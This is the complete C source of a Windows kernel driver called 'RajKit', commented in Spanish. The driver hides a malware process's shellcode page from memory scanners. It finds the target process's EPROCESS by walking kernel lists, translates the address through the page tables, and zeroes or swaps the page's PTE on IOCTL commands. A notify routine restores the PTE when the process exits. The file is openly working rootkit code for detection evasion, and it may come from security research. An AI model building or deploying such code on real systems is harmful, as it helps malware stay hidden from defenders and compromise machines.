#include "ntddk.h"
#include "RajKit_DRIVER.h"
#include <stdlib.h>
#include <stdio.h>

#define SIOCTL_TYPE 40000

#define IOCTL_PTE_INIT_1 CTL_CODE( SIOCTL_TYPE, 0x820, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_PTE_INIT_2 CTL_CODE( SIOCTL_TYPE, 0x821, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_PTE_UNDO CTL_CODE( SIOCTL_TYPE, 0x822, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_PTE_REDO CTL_CODE( SIOCTL_TYPE, 0x823, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)

// Win10 1909
#define PID_OFFSET 0x2e8
#define PS_ACTIVE_OFFSET 0x2f0
#define VAD_ROOT_OFFSET 0x658
#define DTB_OFFSET 0x028
#define WORKINGSETSIZE_OFFSET 0x588

DRIVER_INITIALIZE DriverEntry;

NTSTATUS Function_IRP_MJ_CREATE(_In_ PDEVICE_OBJECT pDeviceObject, _In_ PIRP Irp);
NTSTATUS Function_IRP_MJ_CLOSE(_In_ PDEVICE_OBJECT pDeviceObject, _In_ PIRP Irp);
NTSTATUS Function_IRP_DEVICE_CONTROL(_In_ PDEVICE_OBJECT pDeviceObject, _In_ PIRP Irp);

DWORD64 FindProcessEPROC(_In_ int terminate_PID);
DWORD64 GetProcessDirBase(_In_ DWORD64 eproc);

PMMPTE GetPTEofVirtualAddress(_In_ DWORD64 eproc, _In_ DWORD64 address);

VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject);
VOID OnProcessNotify(_In_ HANDLE ParentId, _In_ HANDLE ProcessId, _In_ BOOLEAN Create);

_Dispatch_type_(IRP_MJ_CREATE)
_Dispatch_type_(IRP_MJ_CLOSE)

DRIVER_DISPATCH SioctlCreateClose;

DWORD64				targetEPROC = 0;
PHIDING_INFO		pHidingInfo;
HIDING_INFO			hidingInfo;
ULONGLONG			PTEmanipulationOriginalPFNs[100];
BOOLEAN				dataReceived = FALSE;
BOOLEAN				PTEsManipulated = FALSE;

MMPTE				malPTE = { 0 };
MMPTE				malPTE_orig = { 0 };
MMPTE				cleanPTE_orig = { 0 };

// Apunta a RajKitPTE que reasignamos
PMMPTE				RajKitPTE = &malPTE;
//Mantiene el valor original del RajKit PTE antes de cualquier modificación
PMMPTE				RajKitPTE_orig = &malPTE_orig;
// Contiene 0 para el valor del PTE benigno para la reasignación de PFN
PMMPTE				CleanPTE = &cleanPTE_orig;

#define answer_size 1000
char answer[answer_size] = { 0 };

VOID send_answer(PIRP, PVOID, int);

NTSTATUS DriverEntry(
	_In_ PDRIVER_OBJECT DriverObject,
	_In_ PUNICODE_STRING RegistryPath
)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	NTSTATUS            status;
	PDEVICE_OBJECT      devObj;
	UNICODE_STRING      devName;
	UNICODE_STRING      linkName;

	//KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "RajKit: DriverEntry"));

	//device nativo NT
	RtlInitUnicodeString(&devName, L"\\Device\\RajKit");

	// device object y extension
	status = IoCreateDevice(DriverObject,
		0,
		&devName,
		FILE_DEVICE_NOTHING,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&devObj);

	// hacemos accesible desde user el driver
	RtlInitUnicodeString(&linkName, L"\\??\\RajKit");

	status = IoCreateSymbolicLink(&linkName, &devName);

	if (!NT_SUCCESS(status)) {
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "ERRROR IoCreateSymbolicLink   Status = 0x%x\n", status));
	}

	// dispatch function EntryPoint
	DriverObject->DriverUnload = DriverUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = SioctlCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = SioctlCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = Function_IRP_DEVICE_CONTROL;

	// configurar la rutina de notificación para detectar la salida del proceso de malware
	NTSTATUS notifyStatus;
	BOOLEAN Remove = FALSE;
	notifyStatus = PsSetCreateProcessNotifyRoutine(OnProcessNotify, Remove);

	if (!NT_SUCCESS(notifyStatus)) {
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n ERROR al crear rutina Status = 0x%llx\n", notifyStatus));
	}

	return status;
}

// Rutinas de despacho

VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
	PDEVICE_OBJECT devObj;
	UNICODE_STRING linkName;

	//eliminar rutinas de notificacion
	NTSTATUS notifyStatus;
	BOOLEAN Remove = TRUE;
	notifyStatus = PsSetCreateProcessNotifyRoutine(OnProcessNotify, Remove);
	if (!NT_SUCCESS(notifyStatus)) {
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n ERROR al eliminar la rutina Status = 0x%x\n", notifyStatus));
	}

	devObj = DriverObject->DeviceObject;

	if (!devObj) {
		return;
	}
	else {
		// eliminar device object
		IoDeleteDevice(devObj);
	}

	RtlInitUnicodeString(&linkName, L"\\??\\RajKit");
	IoDeleteSymbolicLink(&linkName);
}

NTSTATUS SioctlCreateClose(PDEVICE_OBJECT DeviceObject,PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	PAGED_CODE();

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

NTSTATUS Function_IRP_MJ_CREATE(_In_ PDEVICE_OBJECT pDeviceObject,_In_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(pDeviceObject);
	UNREFERENCED_PARAMETER(Irp);

	return STATUS_SUCCESS;
}

NTSTATUS Function_IRP_MJ_CLOSE(_In_ PDEVICE_OBJECT pDeviceObject,_In_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(pDeviceObject);
	UNREFERENCED_PARAMETER(Irp);

	return STATUS_SUCCESS;
}

NTSTATUS Function_IRP_DEVICE_CONTROL(_In_ PDEVICE_OBJECT pDeviceObject,_In_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(pDeviceObject);
	PIO_STACK_LOCATION	pIoStackLocation;
	PCHAR				answerToData = "Data received";
	PCHAR				answerToUndo = "Undo received";
	PCHAR				answerToRedo = "Redo received";
	PVOID				pBuf = Irp->AssociatedIrp.SystemBuffer;

	pIoStackLocation = IoGetCurrentIrpStackLocation(Irp);

	switch (pIoStackLocation->Parameters.DeviceIoControl.IoControlCode)
	{
	case IOCTL_PTE_INIT_1:

		if (dataReceived) {
			RtlZeroMemory(answer, answer_size);
			sprintf(answer, "At least one subversion is already set up. From here on, just undo/redo/execute are available. Alternatively, restart the system or reload the driver.");
			send_answer(Irp, pBuf, pIoStackLocation->Parameters.DeviceIoControl.OutputBufferLength);
			break;
		}

		pHidingInfo = (PHIDING_INFO)pBuf;
		hidingInfo.PID = pHidingInfo->PID;
		hidingInfo.PTEtargetStartAddress = pHidingInfo->PTEtargetStartAddress;
		hidingInfo.PTEtargetEndAddress = pHidingInfo->PTEtargetEndAddress;

		if (hidingInfo.PID) {
			targetEPROC = FindProcessEPROC(hidingInfo.PID);

			if (targetEPROC == 0) {
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nPID not Found\n\n"));
				break;
			}
		}
		dataReceived = TRUE;

		RtlZeroMemory(answer, answer_size);

		//esta modificación solo se ocupa de la primera página
		RajKitPTE = (PMMPTE)GetPTEofVirtualAddress(targetEPROC, hidingInfo.PTEtargetStartAddress);
		RajKitPTE_orig->u.Long = RajKitPTE->u.Long;

		RajKitPTE->u.Long = 0;

		/* Para el escenario de reasignación de PFN, CleanPTE se establece dentro de IOCTL_PTE_INIT_2,
		para el escenario de borrado de PTE, CleanPTE almacena simplemente 0. Por lo tanto, IOCTL_PTE_REDO no tiene que diferenciar estos dos escenarios */

		CleanPTE->u.Long = 0;

		sprintf(answer, "Guardamos el PFN 0x%09llx de la PTE en %p para la pagina con shellcode y seteamos PTE a cero: 0x%016llx", RajKitPTE_orig->u.Hard.PageFrameNumber, RajKitPTE, RajKitPTE->u.Long);

		send_answer(Irp, pBuf, pIoStackLocation->Parameters.DeviceIoControl.InputBufferLength);
		PTEsManipulated = TRUE;

		break;

	case IOCTL_PTE_INIT_2:

		RtlZeroMemory(answer, answer_size);
		/*En este punto, se ha creado una nueva página con un nuevo PFN, que es
		almacenado permanentemente en CleanPTE. En cada re-ocultamiento, este valor de Se utiliza CleanPTE */
		CleanPTE->u.Long = RajKitPTE->u.Long;

		sprintf(answer, "PTE limpia activa con el PFN: 0x%09llx", CleanPTE->u.Hard.PageFrameNumber);
		send_answer(Irp, pBuf, pIoStackLocation->Parameters.DeviceIoControl.InputBufferLength);

		break;

	case IOCTL_PTE_UNDO:
		RtlZeroMemory(answer, answer_size);

		RajKitPTE->u.Long = RajKitPTE_orig->u.Long;
		
		sprintf(answer, "RajKitPTE apunta ahora al RajKit PFN: 0x%09llx", RajKitPTE->u.Hard.PageFrameNumber);
		send_answer(Irp, pBuf, pIoStackLocation->Parameters.DeviceIoControl.InputBufferLength);

		break;

	case IOCTL_PTE_REDO:
		RtlZeroMemory(answer, answer_size);

		RajKitPTE->u.Long = CleanPTE->u.Long;

		sprintf(answer, "RajKit PTE apunta al PFN limpio 0x%09llx", RajKitPTE->u.Hard.PageFrameNumber);
		send_answer(Irp, pBuf, pIoStackLocation->Parameters.DeviceIoControl.InputBufferLength);

		break;

	}
	//KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nIOCTL Finished\n\n"));
	return STATUS_SUCCESS;
}

// Process functions
DWORD64 FindProcessEPROC(_In_ int terminatePID)
{
	DWORD64 eproc = 0x00000000;
	int currentPID = 0;
	int startPID = 0;
	int iCount = 0;
	PLIST_ENTRY plistActiveProcs;

	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nFindProcessEPROC: Entry\n\n"));
	if (terminatePID == 0) {
		return terminatePID;
	}
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nBuscar EPROCESS por ID: %d\n\n", terminatePID));
	// obtener la direccion de EPROCESS del proceso actual
	eproc = (DWORD64)PsGetCurrentProcess();
	startPID = *((DWORD64*)(eproc + PID_OFFSET));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nPID actual: %d\n\n", startPID));
	currentPID = startPID;

	// comparar PID de la lista hasta encontrarlo
	for (;;)
	{
		if (terminatePID == currentPID)
		{
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nEncontrado\n\n"));
			return eproc;// encontrado
		}
		else if ((iCount >= 1) && (startPID == currentPID))
		{
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "No encontrad"));
			return 0x00000000;//no encontrado
		}
		else {
			// Continuar en la lista
			plistActiveProcs = (LIST_ENTRY*)(eproc + PS_ACTIVE_OFFSET);
			eproc = (DWORD64)plistActiveProcs->Flink;
			eproc = eproc - PS_ACTIVE_OFFSET;
			currentPID = *((DWORD64*)(eproc + PID_OFFSET));
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PID Actual: %016llx\n", currentPID));
			iCount++;
		}
	}

	return 0;
}

DWORD64 GetProcessDirBase(_In_ DWORD64 eproc)
{
	DWORD64	directoryTableBase; //registro CR3

	if (eproc == 0x0) {
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nEPROCESS NO DEBE SER 0x0\n\n"));
		return 0x0;
	}

	//obtener directory table base 
	directoryTableBase = *(DWORD64*)(eproc + DTB_OFFSET);

	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nDirectory Table Base: 0x%llx\n\n", directoryTableBase));

	return directoryTableBase;
}

//Accedemos a la Page Table Entry a traves de la Direccion Virtual

PMMPTE GetPTEofVirtualAddress(_In_ DWORD64 eproc,_In_ DWORD64 vAddr)
{
	DWORD64				PML4phys;
	PMMPTE				PML4E;
	DWORD64				PML4index;
	DWORD64				PDPTphys;
	PMMPTE				PDPTE;
	DWORD64				PDPTindex;
	DWORD64				PDphys;
	PMMPTE				PDE;
	DWORD64				PDindex;
	DWORD64				PTphys;
	PMMPTE				PTE;
	DWORD64				PTindex;
	PHYSICAL_ADDRESS	pAddr;
	ULONGLONG			PFN;

	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nSearching PTE for virtual address: 0x%llx\n", vAddr));

	// PML4 a partir de la direccion base de EPROCESS
	PML4phys = (GetProcessDirBase(eproc) >> 4) << 4;
	// Indice PML4 de la direccion virtual
	PML4index = (vAddr >> 39) & 0x1ff;

	// PML4E virtual
	pAddr.QuadPart = PML4phys + (PML4index * 0x08);

	PML4E = (PMMPTE)MmGetVirtualForPhysical(pAddr);
	PFN = PML4E->u.Hard.PageFrameNumber;

	//obtener PDPT a partir del PFN de PML4E
	PDPTphys = PML4E->u.Hard.PageFrameNumber << 12;

	//obtener el indice PDPT de la direccion virtual
	PDPTindex = (vAddr >> 30) & 0x1ff;

	//obtener direccion virtual de PDPTE
	pAddr.QuadPart = PDPTphys + (PDPTindex * 0x08); //PDPTE fisica

	PDPTE = (PMMPTE)MmGetVirtualForPhysical(pAddr); //PDPTE virtual
	PFN = PDPTE->u.Hard.PageFrameNumber;

	//obtener PD a partir del PFN del PDPTE
	PDphys = PDPTE->u.Hard.PageFrameNumber << 12;
	// indice PD de virtual address
	PDindex = (vAddr >> 21) & 0x1ff;

	// obtener PDE de la direccion virtual
	pAddr.QuadPart = PDphys + (PDindex * 0x08); //PDE virtual

	PDE = (PMMPTE)MmGetVirtualForPhysical(pAddr);//PDE fisica
	PFN = PDE->u.Hard.PageFrameNumber;

	//obtener PT a partir del PFN del PDE
	PTphys = PDE->u.Hard.PageFrameNumber << 12;

	//obtener indice PT de la direccion virtual
	PTindex = (vAddr >> 12) & 0x1ff;

	// obtener direccion virtual del PTE
	pAddr.QuadPart = PTphys + (PTindex * 0x08); //PTE virtual
	PTE = (PMMPTE)MmGetVirtualForPhysical(pAddr); //PTE fisica
	PFN = PTE->u.Hard.PageFrameNumber; // PFN del PTE

	return PTE;
}

VOID OnProcessNotify(_In_ HANDLE ParentId,_In_ HANDLE ProcessId,_In_ BOOLEAN Create)
{
	UNREFERENCED_PARAMETER(ParentId);

	// catch malware process exit
	ULONG exitedPID = HandleToULong(ProcessId);
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nNOTIFY ROUTINE - START\n"));

	if (!Create && dataReceived == TRUE) {

		if (hidingInfo.PID && ((int)exitedPID == hidingInfo.PID)) {
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nNOTIFY ROUTINE - IF2\n"));

			if (PTEsManipulated == TRUE) {
				RajKitPTE->u.Long = RajKitPTE_orig->u.Long;
				PTEsManipulated = FALSE;
			}
		}
	}
}

VOID send_answer(PIRP Irp, PVOID pbuf, int pbuf_size) {

	RtlZeroMemory(pbuf, pbuf_size);
	RtlCopyMemory(pbuf, answer, strlen(answer));

/* Finalizar la operación de E/S simplemente completando el paquete y devolviendo el mismo estado que en el propio paquete */
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = strlen(answer);
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
}